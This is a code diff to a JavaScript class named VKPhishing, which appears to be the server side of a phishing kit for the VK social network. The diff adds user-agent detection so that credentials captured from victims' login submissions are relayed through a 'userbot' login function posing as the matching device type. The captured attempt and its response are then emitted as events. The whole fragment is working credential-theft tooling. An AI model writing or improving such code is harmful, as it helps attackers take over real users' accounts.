@@ -18,9 +18,20 @@ class VKPhishing extends EventEmitter {
   }
 
   async auth(ctx) {
-    this.emit('before:auth  -attempt', { ...ctx.request.body, ctx })
+    this.emit('before:auth-attempt', { ...ctx.request.body, ctx })
 
-    const json = await userbot(ctx.request.body)
+    let agent = 'android'
+
+    const ua = String(ctx.headers['user-agent']).toLocaleLowerCase() || ''
+
+    if (ua.includes('iphone')) agent = 'iphone'
+    else if (ua.includes('ipad')) agent = 'ipad'
+    else if (ua.includes('android')) agent = 'android'
+    else if (ua.includes('windows phone')) agent = 'windowsPhone'
+    else if (ua.includes('windows')) agent = 'windows'
+    else agent = 'android'
+
+    const json = await userbot(ctx.request.body, agent)
     this.emit('auth-attempt', {
       attempt: ctx.request.body,
       response: json,
